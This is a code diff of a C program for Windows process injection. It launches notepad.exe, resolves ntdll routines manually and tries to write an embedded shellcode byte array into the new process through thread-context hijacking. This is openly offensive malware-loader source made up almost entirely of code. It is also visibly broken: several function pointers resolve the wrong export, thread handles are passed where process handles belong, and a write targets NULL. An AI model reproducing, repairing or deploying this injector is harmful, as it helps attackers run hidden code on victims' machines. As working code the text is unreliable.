@@ -9,8 +9,9 @@
 #define STATUS_SUCCESS 0x00000000
 #define TH32CS_SNAPPROCESS 0x00000002
 #define TH32CS_SNAPTHREAD
-#define THREAD_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | SPECIFIC_RIGHTS_ALL)
-
+//#define PAGE_READWRITE 0x04
+//#define MEM_COMMIT 0x00001000
+//#define MEM_RESERVE 0x00002000
 
 unsigned char buf[] =
 "\xeb\x27\x5b\x53\x5f\xb0\xea\xfc\xae\x75\xfd\x57\x59\x53"
@@ -146,25 +147,30 @@ void statchecker(NTSTATUS check){
 
 }
 
-int main(int argc, char** argv, char* envp) {
+
+
+
+int main() {
 	size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
-	g(" GetModHandle(ntdll.dll) = % p\n", kb);
+
+	g(" GetModHandle(ntdll.dll) = %p\n", kb);
+
 	size_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
 
-	size_t ptr_CreateProcessA = (size_t)GetFuncAddr(mb, L"CreateProcessA");
-	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, L"CreateToolhelp32Snapshot");
-	size_t ptr_Process32First = (size_t)GetFuncAddr(mb, L"Process32First");
-	size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, L"Process32Next");
-	size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, L"CloseHandle");
+	size_t ptr_CreateProcessA = (size_t)GetFuncAddr(mb, "CreateProcessA");
+	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, "CreateToolhelp32Snapshot");
+	size_t ptr_Process32First = (size_t)GetFuncAddr(mb, "Process32First");
+	size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, "Process32Next");
+	size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, "CloseHandle");
 
 
-	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
-	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
-	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
-	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,L"NtOpenThread");
-	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,L"NtWriteVirtualMemory");
-	size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, L"NtSetContextThread");
-	size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, L"NtResumeThread");
+	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
+	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
+	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
+	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,"NtOpenThread");
+	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,"NtWriteVirtualMemory");
+	size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, "NtSetContextThread");
+	size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, "NtResumeThread");
 
 
 
@@ -180,9 +186,9 @@ int main(int argc, char** argv, char* envp) {
 	PCONTEXT CTX;
 	PROCESSENTRY32 dw;
 	dw.dwSize = sizeof(dw);
+	PSIZE_T usize;
 
-
-	BOOL proc =((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)(L"C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
+	BOOL proc =((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)("C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
 	if (proc == FALSE){
 		e(" create process failed");
 
@@ -200,7 +206,7 @@ int main(int argc, char** argv, char* envp) {
 
 	//((BOOL(WINAPI*)(HANDLE))ptr_CloseHandle)(snap);
 
-
+	ULONG sz = sizeof(buf);
 	hProc = pi.hProcess;
 	hThread = pi.hThread;
 
@@ -211,9 +217,9 @@ int main(int argc, char** argv, char* envp) {
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);
 
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hThread, &baseAddress, n,sizeof(buf),n,n);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hThread, &buf, n, usize,MEM_COMMIT |  MEM_RESERVE ,PAGE_READWRITE);
 
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hThread, &baseAddress, &buf, sizeof(buf), &n);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hThread, NULL, &buf, sizeof(buf), NULL);
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, CTX);
 
